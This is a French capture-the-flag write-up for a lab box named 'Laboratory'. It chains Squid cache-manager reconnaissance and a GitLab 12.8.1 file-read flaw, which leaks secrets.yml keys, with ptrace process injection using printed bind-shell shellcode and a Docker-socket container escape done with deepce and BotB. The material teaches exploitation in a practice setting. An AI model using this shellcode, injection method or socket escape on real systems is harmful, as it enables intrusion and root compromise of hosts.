# Laboratory

Laboratory est un CTF basé de sur container breakout. 

## Reconnaissance



```bash
{13:44}/netsec/box/Laboratory ➭ nmap -sV -sC  192.168.1.19
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 13:44 CEST
Nmap scan report for lab (192.168.1.19)
Host is up (0.00039s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 62:71:bc:a8:96:62:46:f4:56:62:4e:60:b7:98:3b:18 (RSA)
|   256 d9:08:ab:a1:1b:b9:48:46:6c:75:ce:7b:9f:b6:8d:7a (ECDSA)
|_  256 74:27:1f:30:f5:1b:f0:98:d1:60:96:03:e1:c7:3f:14 (ED25519)
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
MAC Address: 00:0C:29:A6:69:6F (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds

```

On remarque du Debian 10. Une version d'SSH sans CVE connue et un proxy Squid. 


## Squid

```bash
{13:58}/netsec/box/Laboratory ➭ curl -x http://192.168.1.19:3128 http://192.168.1.19:3128/squid-internal-mgr/menu -I

HTTP/1.1 403 Forbidden
Server: squid/4.6
Mime-Version: 1.0
Date: Fri, 25 Jun 2021 11:58:31 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 3669
X-Squid-Error: ERR_ACCESS_DENIED 0
Vary: Accept-Language
Content-Language: en
X-Cache: MISS from Lab
X-Cache-Lookup: MISS from Lab:3128
X-Cache: MISS from Lab
X-Cache-Lookup: MISS from Lab:3128
Via: 1.1 Lab (squid/4.6), 1.1 Lab (squid/4.6)
Connection: keep-alive

```
Lorsqu'on essaie de joindre notre Squid nous avons un 403. Pour joindre le cache manager il faut communiquer avec le hostname.

Le hostname est renseigné dans le nmap ou alors on peut le retrouver via la table ARP de notre kali :

```bash
{14:14}/netsec/box/Laboratory ➭ arp 192.168.1.19 
Adresse     TypeMap AdresseMat          Indicateurs           Iface
lab         ether   00:0c:29:a6:69:6f   C                     eth0
```

```bash
{14:10}/netsec/box/Laboratory ➭ nmap -R  192.168.1.19
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 14:10 CEST
Nmap scan report for lab (192.168.1.19)       
Host is up (0.00046s latency).
Not shown: 998 closed ports 
PORT     STATE SERVICE             
22/tcp   open  ssh
3128/tcp open  squid-http  
MAC Address: 00:0C:29:A6:69:6F (VMware)
          
Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds

```

Donc maintenant qu'on a le hostname on peut taper sur le Squid pour récupérer la liste des domaines accéssible depuis le proxy : 

```bash
{14:17}/netsec/box/Laboratory ➭ curl -x http://192.168.1.19:3128 http://lab:3128/squid-internal-mgr/menu -I
HTTP/1.1 200 OK
Server: squid/4.6
Mime-Version: 1.0
Date: Fri, 25 Jun 2021 12:17:17 GMT
Content-Type: text/plain;charset=utf-8
Expires: Fri, 25 Jun 2021 12:17:17 GMT
Last-Modified: Fri, 25 Jun 2021 12:17:17 GMT
X-Cache: MISS from Lab
X-Cache-Lookup: MISS from Lab:3128
Via: 1.1 Lab (squid/4.6)
Connection: keep-alive
```

```bash
{14:18}/netsec/box/Laboratory ➭ curl -x http://192.168.1.19:3128 http://lab:3128/squid-internal-mgr/fqdncache
FQDN Cache Statistics:
FQDNcache Entries In Use: 8
FQDNcache Entries Cached: 8
FQDNcache Requests: 127
FQDNcache Hits: 105
FQDNcache Negative Hits: 0
FQDNcache Misses: 22
FQDN Cache Contents:

Address                                       Flg TTL Cnt Hostnames
127.0.1.1                                       H -001   2 lab.ctf lab
192.168.1.37                                      051   1 kali.home
::1                                             H -001   3 localhost ip6-localhost ip6-loopback
127.0.0.1                                       H -001   1 localhost
ff02::1                                         H -001   1 ip6-allnodes
ff02::2                                         H -001   1 ip6-allrouters
172.19.0.2                                      H -001   1 gitlab.laboratory.ctf

```

On peut voir qu'il y a une URL Gitlab accessible depuis le Squid. 


## GitLab

### Version 12.8.1 LFI
Première étape est de se créer un compte sur le Gitlab. 
Ensuite, il faut aller vérifier la version du Gitlab pour vérifier les différents exploits.

Certains exploit sont 100% automatisés mais voici un compte rendu de l'exploit utilisé : [https://hackerone.com/reports/827052](https://hackerone.com/reports/827052) (Bounty de 20 000$ versé par Gitlab)


### Exploit RCE
Après avoir télécharger le `secret.yml` de Gitlab : 

```bash 
{15:24}/netsec/box/Laboratory ➭ mv /home/allta/secrets.yml .                                                                                                    
{15:24}/netsec/box/Laboratory ➭ cat secrets.yml                     
# This file is managed by gitlab-ctl. Manual changes will be        
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb  
# and run `sudo gitlab-ctl reconfigure`.                            
                                                                               
---                                                                 
production:                                                         
  db_key_base: ccf25bec2aeaf17fdf681091776a0c21fb742921a0cceda163fce14c1b65cb0012e9d3606dff28e4f8688083820590684beb0bf8c65c75cfde9b79dcd844490d
  secret_key_base: f96c6e7ac4e9a0292ecca26f716054b1e82263c07bd21b71ea9631262225bd67b1e27ac68ba94d49e5018e43e6fc2da278929f89299227f930cd902e8cae263d
  otp_key_base: 661110e2fc938ab305f28db2e038fc0467beb7a392211e27f711ede46e9233fb9736b3ba0ad216061dfc4f38513c6043abec3efaa66d6ce26093d83656719837
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    MIIJKgIBAAKCAgEAtaEEQoreuAdPPHl57wHFCbFIatfFlNp5fxtg9fUcfy4Pj3y6
    S2iCHOlr+Rw6NGKLLMOtSl9WqVf8uDP5UxAPdQa+tkfp2EJnJmsyY/2DLodoNdEk
    Z/DjZZ+zTg/6ZTBsSskeoaMp4KeZcVj+dxRQGuh0NZUcsBPHvEu/4HPhQsjGtJza
    WB68q+qgHCtikNIMos+5BkJQLbkKbw76lxkSu2adQutSvg9uK/g+gkujz6BZ6+Un


```

Pour générer notre payload il va falloir le créer à l'aide de la clef privée récupéré via la LFI.
Pour cela il faut monter un gitlab de même version et y remplacer la clef générée par celle récupérée. 
Le meilleur moyen de monter un Gitlab rapidement et avec la bonne version est via Docker. 

```bash
{15:24}/netsec/box/Laboratory ➭ docker pull gitlab/gitlab-ce:12.8.1-ce.0
12.8.1-ce.0: Pulling from gitlab/gitlab-ce
fe703b657a32: Pull complete 
f9df1fafd224: Pull complete 
a645a4b887f9: Pull complete 
57db7fe0b522: Pull complete 
7c1fdc95f4c9: Pull complete 
efff5e3fbef4: Pull complete 
cd352b2b7d4b: Pull complete 
9cfdfa991813: Pull complete 
27f887c2ede5: Pull complete 
68b87e2fd6a0: Pull complete 
Digest: sha256:01325161649a28155d8857e4f47462d2bf9406d612c11b8929d2482bfba3ad32
Status: Downloaded newer image for gitlab/gitlab-ce:12.8.1-ce.0
docker.io/gitlab/gitlab-ce:12.8.1-ce.0

{15:24}/netsec/box/Laboratory ➭ docker run --rm -d 719e7e45b1e2
8d3027edf640a3849d9c127ca512809736d498de5c8895379013bda26b1385b1
{15:24}/netsec/box/Laboratory ➭ docker ps -a
CONTAINER ID   IMAGE          COMMAND             CREATED         STATUS                            PORTS                     NAMES
8d3027edf640   719e7e45b1e2   "/assets/wrapper"   3 seconds ago   Up 2 seconds (health: starting)   22/tcp, 80/tcp, 443/tcp   heuristic_leavitt
{15:24}/netsec/box/Laboratory ➭ docker exec -ti 8d3 bash
root@8d3027edf640:/# 
```

On remplace le secret dans le container Gitlab : 
```bash
{16:16}/netsec/box/Laboratory ➭ python3 -m http.server 8181
Serving HTTP on 0.0.0.0 port 8181 (http://0.0.0.0:8181/) ...

root@8d3027edf640:/tmp# wget http://192.168.1.37/secrets.yml
root@8d3027edf640:/tmp# mv secrets.yml /var/opt/gitlab/gitlab-rails/etc/secrets.yml 

root@8d3027edf640:/tmp# md5sum /var/opt/gitlab/gitlab-rails/etc/secrets.yml
6f85c9ff680877c06f63cc73fecc02a6  /var/opt/gitlab/gitlab-rails/etc/secrets.yml
{16:19}/netsec/box/Laboratory ➭ md5sum secrets.yml          
6f85c9ff680877c06f63cc73fecc02a6  secrets.yml
```

#### Creation du payload



## Container Lateral Escapce


On peut voir que le container `dns_proxy_server` est paramétré pour partager son PID Namespace avec le container `gitlab`. Les processus des 2 containers sont donc visibles par l'un ou l'autre. 

```bash
dexter@Lab:/opt$ cat dps/docker-compose.yml 
version: '3'
services:
    dps:
      image: dns_proxy_server
      environment:
        - MG_REGISTER_CONTAINER_NAMES=1
      volumes:
        - /var/run/docker.sock:/var/run/docker.sock
      pid: container:gitlab
      command: "/app/dns-proxy-server"
      networks:
        - dps
networks:
  dps:
    external: true

```



On peut aussi voir dans le docker-compose du container `dps` la commande lancée lors du démarrage du container : 

```bash
root@gitlab:/# ps aux | grep "/[a]pp/"
root       1801  0.0  0.2 627820  4064 ?        Ssl  07:03   0:00 /app/dns-proxy-server /app/dns-proxy-server
```
Voici les différents namespaces du container gitlab : 

```bash
root@gitlab:/# ll /proc/self/ns/
total 0
dr-x--x--x 2 root root 0 Jun 28 08:08 ./
dr-xr-xr-x 9 root root 0 Jun 28 08:08 ../
lrwxrwxrwx 1 root root 0 Jun 28 08:08 cgroup -> cgroup:[4026531835]
lrwxrwxrwx 1 root root 0 Jun 28 08:08 ipc -> ipc:[4026532554]
lrwxrwxrwx 1 root root 0 Jun 28 08:08 mnt -> mnt:[4026532552]
lrwxrwxrwx 1 root root 0 Jun 28 08:08 net -> net:[4026532556]
lrwxrwxrwx 1 root root 0 Jun 28 08:08 pid -> pid:[4026531836]
lrwxrwxrwx 1 root root 0 Jun 28 08:08 pid_for_children -> pid:[4026531836]
lrwxrwxrwx 1 root root 0 Jun 28 08:08 user -> user:[4026531837]
lrwxrwxrwx 1 root root 0 Jun 28 08:08 uts -> uts:[4026532553]

```

Et les namespaces du container dps : 

```bash
root@gitlab:/# ll /proc/1801/ns
total 0
dr-x--x--x 2 root root 0 Jun 28 08:09 ./
dr-xr-xr-x 9 root root 0 Jun 28 07:45 ../
lrwxrwxrwx 1 root root 0 Jun 28 08:09 cgroup -> cgroup:[4026531835]
lrwxrwxrwx 1 root root 0 Jun 28 08:09 ipc -> ipc:[4026532616]
lrwxrwxrwx 1 root root 0 Jun 28 08:09 mnt -> mnt:[4026532614]
lrwxrwxrwx 1 root root 0 Jun 28 08:09 net -> net:[4026532618]
lrwxrwxrwx 1 root root 0 Jun 28 08:09 pid -> pid:[4026531836]
lrwxrwxrwx 1 root root 0 Jun 28 08:09 pid_for_children -> pid:[4026531836]
lrwxrwxrwx 1 root root 0 Jun 28 08:09 user -> user:[4026531837]
lrwxrwxrwx 1 root root 0 Jun 28 08:09 uts -> uts:[4026532615]
```

On peut voir qu'en plus de partager le namespace PID ils partagent aussi le namespace users. Ce qui veut dire que root sur container gitlab sera aussi root sur le container dps.

Le docker-compose de gitlab nous montre une capabilities qui n'est pas par défaut lors de la création d'un container : ptrace. 

Ceci est confirmé dans le container : 

```bash
root@gitlab:/tmp# capsh --print | grep ptrace
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
```

La combinaison de ces 2 mauvaises pratiques/configuration va nous permettre de réaliser une injection de code au sein d'un processus. 

Voici un article sur l'injection de code dans un process running : [https://0x00sec.org/t/linux-infecting-running-processes/1097](https://0x00sec.org/t/linux-infecting-running-processes/1097) qui explique et propose un POC. 

Ce qu'il faut retenir c'est que tout les programmes de debug utilisent la capabilitie `ptrace`. Cette dernière permet de s'attacher à un process et de le modifier. 


### Exploit Process Injection 

```bash
root@gitlab:/dev/shm# wget https://raw.githubusercontent.com/0x00pf/0x00sec_code/master/mem_inject/infect.c

```

On remplace dans l'exploit le shellcode pour y mettre un bind sur le port 5600 (Comme ça on maitrise le paramètre du Reverse Shell dans l'exploit)

ShellCode : [https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128)

Il faut remplacer dans l'exploit `infect.c` : 

```bash 

#define SHELLCODE_SIZE 32

unsigned char *shellcode =
  "\x48\x31\xc0\x48\x89\xc2\x48\x89"
  "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
  "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
  "\x2f\x73\x68\x00\xcc\x90\x90\x90";
```

par 


```bash 

#define SHELLCODE_SIZE 87

unsigned char *shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";
```

```bash
apt update && apt install gcc
root@gitlab:/dev/shm# gcc infect.c -o /tmp/infect
root@gitlab:/tmp# ./infect 
Usage:
        ./infect pid

root@gitlab:/tmp# ./infect 1801
+ Tracing process 1801
+ Waiting for process...
+ Getting Registers
+ Injecting shell code at 0x45c7e0
+ Setting instruction pointer to 0x45c7e2
+ Run it!
```

Le processus a bien été infecté par l'exploit. Le code malveillant ajouté au processus permet de spawn un Revershell sur le port 5600. 
Il faut maintenant trouver l'ip du container `dps`. 

Le container `gitlab` sur lequel on se trouve actuellement et le container `dps` sont sur le même network docker comme vu dans leur docker-compose. Notre user `dexter` n'a pas la permission de lancer de commande docker. Il va falloir trouver l'ip manuellement à partir du container. 

```bash 
root@gitlab:/tmp# hostname -i
172.19.0.2
``` 

On part du principe que le container `dps` sera en `172.19.0.3`
Pour se connecter à ce container on utilise netcat (qu'il faut installer comme gcc).

```bash 
root@gitlab:/tmp# nc 172.19.0.3 5600
id
uid=0(root) gid=0(root) groups=0(root)
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@448e6b22790a:/app# 
```

Une fois root sur le container `dps` il va falloir s'échapper de ce container pour arriver root sur l'host. 

## Container Breakout 

Lors de l'énumération avec le compte `dexter` on a pu avoir accès en lecture sur les docker-compose. 
On s'est rendu compte que le socket docker était exposé dans le container `dps`.
Ce partage de socket est une vulnérabilité et ne dois absolument pas être fait ou alors dans des conditions bien précises .

Nous allons l'utilisé pour passer accéder au FS entier de l'host. 

On peut faire ça à la main ou alors utiliser [deepce](https://github.com/stealthcopter/deepce). 
DeepCE est un script d'énumération docker (Comme un Linpeas/LinEnum).

Pensez à installer curl pour exploiter le socket docker.

On ne pourr pas monter de Reverse Shell sur notre Kali car les container n'ont pas d'accès direct au LAN.


```bash
oot@448e6b22790a:/app# ./deepce.sh                                                                                                                                                    [18/18]

                      ##         .                                                             
                ## ## ##        ==                                                             
             ## ## ## ##       ===           
         /"""""""""""""""""\___/ ===                                                           
    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~
         \______ X           __/ 
           \    \         __/
            \____\_______/
          __
     ____/ /__  ___  ____  ________                                                            
    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE               
   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
                 /_/                                                                           
                                               
 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter                 
                                               
==========================================( Colors )==========================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check        
[+] Negative Test ........... No 
[+] Multi line test ......... Yes                              

===================================( Enumerating Platform )===================================                                                                                                [+] Inside Container ........ Yes
[+] Container Platform ...... docker                                                           
[+] Container tools ......... None
[+] User .................... root
[+] Groups .................. root                                                             
[+] Docker Executable ....... Not Found
[+] Docker Sock ............. Yes                                                              
srw-rw---- 1 root 998 0 Jun 28 07:00 /var/run/docker.sock
[+] Sock is writable ........ Yes                                                              
The docker sock is writable, we should be able to enumerate docker, create containers 
and obtain root privs on the host machine
See https://stealthcopter.github.io/deepce/guides/docker-sock.md      
```


DeepCE nous a montré qu'un SOCKET été en lecture/écriture. Nous allons utiliser [Break out the Box](https://github.com/brompwnie/botb) pour sortir du container. 

Go étant un peu lourd à installer nous allons passer par la release direct : 
[https://github.com/brompwnie/botb/releases](https://github.com/brompwnie/botb/releases)

```
root@448e6b22790a:/tmp# ./botb-linux-amd64 -autopwn                                                                                                                                      [6/6]
[+] Break Out The Box                                                                                                                                                                         
[+] Attempting to autopwn                                                                      
[+] Hunting Docker Socks
[+] Attempting to autopwn:  /run/docker.sock                                                                                                                                                  
[+] Attempting to escape to host...                                                                                                                                                           
[+] Attempting in TTY Mode
```

Ce que fait BotB est simple, il installe docker via les sources officielles, et ensuite en utilisant le socket docker présent sur l'hôte il créer un container en lui montant le FS de l'hôte comme volume sur le nouveau container crée. 

Voici le bout de code dans BotB qui permet de gérér le pwn : https://github.com/brompwnie/botb/blob/74ec7f0cac5da365176d2f9f4fb41beb97b97963/utils.go#L472 



Voilà Root sur l'host. 